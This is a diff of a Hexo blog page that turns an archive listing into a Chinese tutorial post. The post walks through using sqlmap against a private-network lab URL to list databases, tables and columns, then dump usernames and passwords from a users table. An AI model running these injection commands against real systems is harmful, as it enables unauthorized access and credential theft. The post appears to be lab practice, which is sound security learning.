@@ -3,19 +3,30 @@
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
   
-  <title>Archives: 2019/8 | You</title>
+  <title>You</title>
 
   <!-- keywords -->
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+  <meta name="description" content="使用sqlmap爆库1.检测是否可以注入  2.爆库 sqlmap.py -u http://172.16.13.36/sql/union.php?id=1 –dbs   得到库名mysql performance_schema information_schema test 我们爆test数据库 3.爆表 sqlmap.py -u http://172.16.13.36/sql/union.ph">
+<meta property="og:type" content="article">
 <meta property="og:title" content="You">
-<meta property="og:url" content="http://yoursite.com/archives/2019/08/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/08/17/使用sqlmap爆库/index.html">
 <meta property="og:site_name" content="You">
+<meta property="og:description" content="使用sqlmap爆库1.检测是否可以注入  2.爆库 sqlmap.py -u http://172.16.13.36/sql/union.php?id=1 –dbs   得到库名mysql performance_schema information_schema test 我们爆test数据库 3.爆表 sqlmap.py -u http://172.16.13.36/sql/union.ph">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="https://wx4.sinaimg.cn/mw690/007WZes1gy1g62si895acj30pm07mdg7.jpg">
+<meta property="og:image" content="https://wx4.sinaimg.cn/mw690/007WZes1gy1g62si9vthxj30pq0dc75c.jpg">
+<meta property="og:image" content="https://wx3.sinaimg.cn/mw690/007WZes1gy1g62sibie7rj30or065dg5.jpg">
+<meta property="og:image" content="https://wx3.sinaimg.cn/mw690/007WZes1gy1g62sidxgxfj30w006z0sy.jpg">
+<meta property="og:image" content="https://wx2.sinaimg.cn/mw690/007WZes1gy1g62sifguqhj30tb09f0t4.jpg">
+<meta property="og:image" content="https://wx1.sinaimg.cn/mw690/007WZes1gy1g62sihaadrj30ho05rmx9.jpg">
+<meta property="og:updated_time" content="2019-08-17T09:20:55.255Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="You">
+<meta name="twitter:description" content="使用sqlmap爆库1.检测是否可以注入  2.爆库 sqlmap.py -u http://172.16.13.36/sql/union.php?id=1 –dbs   得到库名mysql performance_schema information_schema test 我们爆test数据库 3.爆表 sqlmap.py -u http://172.16.13.36/sql/union.ph">
+<meta name="twitter:image" content="https://wx4.sinaimg.cn/mw690/007WZes1gy1g62si895acj30pm07mdg7.jpg">
   
   
     <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
@@ -160,44 +171,70 @@
 		</header>				
 	</div>
 </nav>
-      <div class="body-wrap">
+      <div class="body-wrap"><article id="post-使用sqlmap爆库" class="article article-type-post" itemscope itemprop="blogPost">
   
-  
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/08/17/使用sqlmap爆库/" class="archive-article-date">
-  	<time datetime="2019-08-17T09:20:55.077Z" itemprop="datePublished">Aug 17</time>
+    <div class="article-meta">
+      <a href="/2019/08/17/使用sqlmap爆库/" class="article-date">
+  	<time datetime="2019-08-17T09:20:55.077Z" itemprop="datePublished">2019-08-17</time>
 </a>
-        </div>
-    	 
-        <div class="article-info info-on-left">
-          
-          
-
-          
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+    </div>
   
-  
-    </div></section>
-  
-
+  <div class="article-inner">
     
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="使用sqlmap爆库"><a href="#使用sqlmap爆库" class="headerlink" title="使用sqlmap爆库"></a>使用sqlmap爆库</h1><p>1.检测是否可以注入</p>
+<p><img src="https://wx4.sinaimg.cn/mw690/007WZes1gy1g62si895acj30pm07mdg7.jpg" alt></p>
+<p>2.爆库</p>
+<p>sqlmap.py -u <a href="http://172.16.13.36/sql/union.php?id=1" target="_blank" rel="noopener">http://172.16.13.36/sql/union.php?id=1</a> –dbs</p>
+<p><img src="https://wx4.sinaimg.cn/mw690/007WZes1gy1g62si9vthxj30pq0dc75c.jpg" alt></p>
+<p><img src="https://wx3.sinaimg.cn/mw690/007WZes1gy1g62sibie7rj30or065dg5.jpg" alt></p>
+<p>得到库名mysql performance_schema information_schema test</p>
+<p>我们爆test数据库</p>
+<p>3.爆表</p>
+<p>sqlmap.py -u <a href="http://172.16.13.36/sql/union.php?id=1" target="_blank" rel="noopener">http://172.16.13.36/sql/union.php?id=1</a> -D test –tables</p>
+<p><img src="https://wx3.sinaimg.cn/mw690/007WZes1gy1g62sidxgxfj30w006z0sy.jpg" alt></p>
+<p>成功得到表名</p>
+<p>4.爆字段</p>
+<p>sqlmap.py -u <a href="http://172.16.13.36/sql/union.php?id=1" target="_blank" rel="noopener">http://172.16.13.36/sql/union.php?id=1</a> -D test -T users –columns</p>
+<p><img src="https://wx2.sinaimg.cn/mw690/007WZes1gy1g62sifguqhj30tb09f0t4.jpg" alt></p>
+<p>得到字段名</p>
+<p>5.爆数据</p>
+<p>sqlmap.py -u <a href="http://172.16.13.36/sql/union.php?id=1" target="_blank" rel="noopener">http://172.16.13.36/sql/union.php?id=1</a> -D test -T users -C username,password –dump</p>
+<p><img src="https://wx1.sinaimg.cn/mw690/007WZes1gy1g62sihaadrj30ho05rmx9.jpg" alt></p>
+<p>通过字段得到数据。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="使用sqlmap爆库" data-title="" data-url="http://yoursite.com/2019/08/17/使用sqlmap爆库/"  data-images="https://wx1.sinaimg.cn/mw1024/006tqKxcgy1g5tfe98lh3j30hs0hs74u.jpg" data-content="">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
 
 </div>
       <footer id="footer">
@@ -223,8 +260,8 @@
 		mathjax: true,
 		animate: true,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false
